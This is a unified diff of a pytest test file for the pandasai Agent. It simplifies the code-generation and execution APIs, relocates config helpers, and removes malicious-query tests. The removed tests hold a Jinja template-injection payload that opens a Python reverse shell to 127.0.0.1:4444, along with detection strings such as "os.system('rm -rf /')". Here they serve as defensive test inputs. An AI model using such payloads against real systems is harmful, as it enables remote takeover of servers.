@@ -8,7 +8,7 @@ import pytest
 from pandasai.agent.base import Agent
 from pandasai.config import Config, ConfigManager
 from pandasai.dataframe.base import DataFrame
-from pandasai.exceptions import CodeExecutionError, MaliciousQueryError
+from pandasai.exceptions import CodeExecutionError
 from pandasai.helpers.dataframe_serializer import DataframeSerializerType
 from pandasai.llm.fake import FakeLLM
 
@@ -28,7 +28,8 @@ class TestAgent:
                     14631844184064,
                 ],
                 "happiness_index": [6.94, 7.22, 5.87, 5.12],
-            }
+            },
+            name="countries",
         )
 
     @pytest.fixture
@@ -76,37 +77,32 @@ class TestAgent:
     def test_code_generation(self, mock_generate_code, sample_df, config):
         # Create an Agent instance for testing
         mock_generate_code.generate_code.return_value = (
-            "print(United States has the highest gdp)",
-            [],
+            "print(United States has the highest gdp)"
         )
         agent = Agent(sample_df, config)
         agent._code_generator = mock_generate_code
 
         # Test the chat function
-        response, additional_dependencies = agent.generate_code(
-            "Which country has the highest gdp?"
-        )
+        response = agent.generate_code("Which country has the highest gdp?")
         assert agent._code_generator.generate_code.called
         assert isinstance(response, str)
-        assert isinstance(additional_dependencies, list)
-
         assert response == "print(United States has the highest gdp)"
 
     @patch("pandasai.agent.base.CodeGenerator")
     def test_generate_code_with_cache_hit(self, mock_generate_code, agent: Agent):
         # Set up the cache to return a pre-cached response
-        cached_code = "print('Cached result: US has the highest GDP.')"
+        cached_code = """execute_sql_query('SELECT country FROM countries ORDER BY gdp DESC LIMIT 1')
+print('Cached result: US has the highest GDP.')"""
         agent._state.config.enable_cache = True
         agent._state.cache.get = MagicMock(return_value=cached_code)
 
         # Mock code generator is not used because of the cache hit
         mock_generate_code.validate_and_clean_code.return_value = (
-            "print('Cached result: US has the highest GDP.')",
-            [],
+            "print('Cached result: US has the highest GDP.')"
         )
 
         # Generate code
-        response, _ = agent.generate_code("Which country has the highest GDP?")
+        response = agent.generate_code("Which country has the highest GDP?")
 
         # Check that the cached code was used
         assert response == cached_code
@@ -120,36 +116,27 @@ class TestAgent:
 
         # Mock the code generator to return a new response
         mock_generate_code.generate_code.return_value = (
-            "print('New result: US has the highest GDP.')",
-            [],
+            "print('New result: US has the highest GDP.')"
         )
         agent._code_generator = mock_generate_code
 
         # Generate code
-        response, additional_dependencies = agent.generate_code(
-            "Which country has the highest GDP?"
-        )
+        response = agent.generate_code("Which country has the highest GDP?")
 
         # Check that the cache miss triggered new code generation
         assert mock_generate_code.generate_code.called
         assert response == "print('New result: US has the highest GDP.')"
 
     @patch("pandasai.agent.base.CodeGenerator")
-    def test_generate_code_with_direct_sql(self, mock_generate_code, agent: Agent):
-        # Enable direct SQL in the config
-        agent._state.config.direct_sql = True
-
+    def test_generate_code_with(self, mock_generate_code, agent: Agent):
         # Mock the code generator to return a SQL-based response
         mock_generate_code.generate_code.return_value = (
-            "SELECT country FROM countries ORDER BY gdp DESC LIMIT 1;",
-            [],
+            "SELECT country FROM countries ORDER BY gdp DESC LIMIT 1;"
         )
         agent._code_generator = mock_generate_code
 
         # Generate code
-        response, additional_dependencies = agent.generate_code(
-            "Which country has the highest GDP?"
-        )
+        response = agent.generate_code("Which country has the highest GDP?")
 
         # Check that the SQL-specific prompt was used
         assert mock_generate_code.generate_code.called
@@ -161,16 +148,11 @@ class TestAgent:
         agent._state.logger.log = MagicMock()
 
         # Mock the code generator
-        mock_generate_code.generate_code.return_value = (
-            "print('Logging test.')",
-            [],
-        )
+        mock_generate_code.generate_code.return_value = "print('Logging test.')"
         agent._code_generator = mock_generate_code
 
         # Generate code
-        response, additional_dependencies = agent.generate_code(
-            "Test logging during code generation."
-        )
+        response = agent.generate_code("Test logging during code generation.")
 
         # Verify logger was called
         agent._state.logger.log.assert_any_call("Generating new code...")
@@ -181,18 +163,13 @@ class TestAgent:
     def test_generate_code_updates_last_prompt(self, mock_generate_code, agent: Agent):
         # Mock the code generator
         prompt = "Cust  om SQL prompt"
-        mock_generate_code.generate_code.return_value = (
-            "print('Prompt test.')",
-            [],
-        )
+        mock_generate_code.generate_code.return_value = "print('Prompt test.')"
         agent._state.last_prompt_used = None
         agent._code_generator = mock_generate_code
 
         # Mock the prompt creation function
-        with patch("pandasai.agent.base.get_chat_prompt", return_value=prompt):
-            response, additional_dependencies = agent.generate_code(
-                "Which country has the highest GDP?"
-            )
+        with patch("pandasai.agent.base.get_chat_prompt_for_sql", return_value=prompt):
+            response = agent.generate_code("Which country has the highest GDP?")
 
         # Verify the last prompt used is updated
         assert agent._state.last_prompt_used == prompt
@@ -205,46 +182,33 @@ class TestAgent:
         mock_code_executor.return_value.execute_and_return_result.return_value = {
             "result": "Execution successful"
         }
-        mock_code_executor.return_value.add_to_env = MagicMock()
 
         # Execute the code
         code = "print('Hello, World!')"
-        additional_dependencies = ["numpy"]
-        result = agent.execute_code(code, additional_dependencies)
+        result = agent.execute_code(code)
 
         # Verify the code was executed and the result is correct
         assert result == {"result": "Execution successful"}
-        mock_code_executor.return_value.add_to_env.assert_any_call(
-            "dfs", agent._state.dfs
-        )
         mock_code_executor.return_value.execute_and_return_result.assert_called_with(
             code
         )
 
     @patch("pandasai.agent.base.CodeExecutor")
-    def test_execute_code_with_direct_sql(self, mock_code_executor, agent: Agent):
-        # Enable direct SQL in the config
-        agent._state.config.direct_sql = True
-
+    def test_execute_code(self, mock_code_executor, agent: Agent):
         # Mock CodeExecutor to return a result
         mock_code_executor.return_value.execute_and_return_result.return_value = {
             "result": "SQL Execution successful"
         }
-        mock_code_executor.return_value.add_to_env = MagicMock()
 
         # Mock SQL method in the DataFrame
         agent._state.dfs[0].execute_sql_query = MagicMock()
 
         # Execute the code
         code = "execute_sql_query('SELECT * FROM table')"
-        additional_dependencies = []
-        result = agent.execute_code(code, additional_dependencies)
+        result = agent.execute_code(code)
 
         # Verify the SQL execution environment was set up correctly
         assert result == {"result": "SQL Execution successful"}
-        mock_code_executor.return_value.add_to_env.assert_any_call(
-            "execute_sql_query", agent._state.dfs[0].execute_sql_query
-        )
         mock_code_executor.return_value.execute_and_return_result.assert_called_with(
             code
         )
@@ -261,8 +225,7 @@ class TestAgent:
 
         # Execute the code
         code = "print('Logging test')"
-        additional_dependencies = []
-        result = agent.execute_code(code, additional_dependencies)
+        result = agent.execute_code(code)
 
         # Verify the logger was called with the correct message
         agent._state.logger.log.assert_called_with(f"Executing code: {code}")
@@ -282,10 +245,9 @@ class TestAgent:
 
         # Execute the code
         code = "import pandas as pd; print(pd.DataFrame())"
-        additional_dependencies = ["pandas"]
 
         with pytest.raises(ImportError):
-            agent.execute_code(code, additional_dependencies)
+            agent.execute_code(code)
 
         # Verify the CodeExecutor was called despite the missing dependency
         mock_code_executor.return_value.execute_and_return_result.assert_called_with(
@@ -299,8 +261,7 @@ class TestAgent:
 
         # Execute empty code
         code = ""
-        additional_dependencies = []
-        result = agent.execute_code(code, additional_dependencies)
+        result = agent.execute_code(code)
 
         # Verify the result is empty and the code executor was not called
         assert result == {}
@@ -321,9 +282,9 @@ class TestAgent:
         # Mock the code generator
         agent._code_generator = Mock()
         expected_code = "print('Test successful')"
-        agent._code_generator.generate_code.return_value = (expected_code, [])
+        agent._code_generator.generate_code.return_value = expected_code
 
-        code, deps = agent.generate_code("Test query")
+        code = agent.generate_code("Test query")
         assert code == expected_code
         assert agent._code_generator.generate_code.call_count == 1
 
@@ -332,13 +293,13 @@ class TestAgent:
         agent.execute_code = Mock()
         agent.execute_code.side_effect = CodeExecutionError("Test error")
         agent._regenerate_code_after_error = Mock()
-        agent._regenerate_code_after_error.return_value = ("test_code", [])
+        agent._regenerate_code_after_error.return_value = "test_code"
 
         # Set max retries to 3 explicitly
         agent._state.config.max_retries = 3
 
         with pytest.raises(CodeExecutionError):
-            agent.execute_with_retries("test_code", [])
+            agent.execute_with_retries("test_code")
 
         # Should be called max_retries times
         assert agent.execute_code.call_count == 4
@@ -359,9 +320,9 @@ class TestAgent:
             expected_result,  # Third regenerated code succeeds
         ]
         agent._regenerate_code_after_error = Mock()
-        agent._regenerate_code_after_error.return_value = ("test_code", [])
+        agent._regenerate_code_after_error.return_value = "test_code"
 
-        result = agent.execute_with_retries("test_code", [])
+        result = agent.execute_with_retries("test_code")
         # Response parser returns a String object with value accessible via .value
         assert result.value == "Success"
         # Should have 4 execute attempts and 3 regenerations
@@ -374,26 +335,60 @@ class TestAgent:
         agent.execute_code = Mock()
         agent.execute_code.side_effect = CodeExecutionError("Test error")
         agent._regenerate_code_after_error = Mock()
-        agent._regenerate_code_after_error.return_value = ("test_code", [])
+        agent._regenerate_code_after_error.return_value = "test_code"
 
         with pytest.raises(CodeExecutionError):
-            agent.execute_with_retries("test_code", [])
+            agent.execute_with_retries("test_code")
 
         # Should be called max_retries + 1 times (initial try + retries)
         assert agent.execute_code.call_count == 6
         assert agent._regenerate_code_after_error.call_count == 5
 
     def test_load_llm_with_pandasai_llm(self, agent: Agent, llm):
-        assert agent._get_llm(llm) == llm
+        assert agent._state._get_llm(llm) == llm
 
     def test_load_llm_none(self, agent: Agent, llm):
         mock_llm = FakeLLM()
-        with patch("pandasai.agent.base.BambooLLM", return_value=mock_llm), patch.dict(
+        with patch("pandasai.agent.state.BambooLLM", return_value=mock_llm), patch.dict(
             os.environ, {"PANDABI_API_KEY": "test_key"}
         ):
-            config = agent._get_config({})
+            config = agent._state._get_config({})
             assert isinstance(config, Config)
             assert config.llm == mock_llm
+
+    def test_get_config_none(self, agent: Agent):
+        """Test that _get_config returns global config when input is None"""
+        mock_config = Config()
+        with patch.object(ConfigManager, "get", return_value=mock_config):
+            config = agent._state._get_config(None)
+            assert config == mock_config
+
+    def test_get_config_dict(self, agent: Agent):
+        """Test that _get_config properly handles dict input"""
+        mock_llm = FakeLLM()
+        test_dict = {"save_logs": False, "verbose": True, "llm": mock_llm}
+        config = agent._state._get_config(test_dict)
+        assert isinstance(config, Config)
+        assert config.save_logs is False
+        assert config.verbose is True
+        assert config.llm == mock_llm
+
+    def test_get_config_dict_with_api_key(self, agent: Agent):
+        """Test that _get_config adds BambooLLM when API key is present"""
+        mock_llm = FakeLLM()
+        with patch.dict(os.environ, {"PANDABI_API_KEY": "test_key"}), patch(
+            "pandasai.agent.state.BambooLLM", return_value=mock_llm
+        ):
+            config = agent._state._get_config({})
+            assert isinstance(config, Config)
+            assert config.llm == mock_llm
+
+    def test_get_config_config(self, agent: Agent):
+        """Test that _get_config returns Config object unchanged"""
+        original_config = Config(save_logs=False, verbose=True)
+        config = agent._state._get_config(original_config)
+        assert config == original_config
+        assert isinstance(config, Config)
 
     def test_train_method_with_qa(self, agent):
         queries = ["query1", "query2"]
@@ -435,61 +430,3 @@ class TestAgent:
         codes = ["code1", "code2"]
         with pytest.raises(ValueError):
             agent.train(codes)
-
-    def test_malicious_query_detection(self, sample_df, config):
-        agent = Agent(sample_df, config, memory_size=10)
-
-        with pytest.raises(MaliciousQueryError):
-            agent.chat(
-                """{% for x in ().__class__.__base__.__subclasses__() %} {% if "warning" in x.__name__ %} {{x()._module.__builtins__['__import__']('os').popen('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\\'')}} {% endif %} {% endfor %}"""
-            )
-
-    def test_query_detection(self, sample_df, config, agent: Agent):
-        # Positive cases: should detect malicious keywords
-        malicious_queries = [
-            "import os",
-            "import io",
-            "chr(97)",
-            "base64.b64decode",
-            "file = open('file.txt', 'os')",
-            "os.system('rm -rf /')",
-            "io.open('file.txt', 'w')",
-        ]
-
-        for query in malicious_queries:
-            with pytest.raises(MaliciousQueryError):
-                agent.chat(query)
-
-    def test_get_config_none(self, agent: Agent):
-        """Test that _get_config returns global config when input is None"""
-        mock_config = Config()
-        with patch.object(ConfigManager, "get", return_value=mock_config):
-            config = agent._get_config(None)
-            assert config == mock_config
-
-    def test_get_config_dict(self, agent: Agent):
-        """Test that _get_config properly handles dict input"""
-        mock_llm = FakeLLM()
-        test_dict = {"save_logs": False, "verbose": True, "llm": mock_llm}
-        config = agent._get_config(test_dict)
-        assert isinstance(config, Config)
-        assert config.save_logs is False
-        assert config.verbose is True
-        assert config.llm == mock_llm
-
-    def test_get_config_dict_with_api_key(self, agent: Agent):
-        """Test that _get_config adds BambooLLM when API key is present"""
-        mock_llm = FakeLLM()
-        with patch.dict(os.environ, {"PANDABI_API_KEY": "test_key"}), patch(
-            "pandasai.agent.base.BambooLLM", return_value=mock_llm
-        ):
-            config = agent._get_config({})
-            assert isinstance(config, Config)
-            assert config.llm == mock_llm
-
-    def test_get_config_config(self, agent: Agent):
-        """Test that _get_config returns Config object unchanged"""
-        original_config = Config(save_logs=False, verbose=True)
-        config = agent._get_config(original_config)
-        assert config == original_config
-        assert isinstance(config, Config)
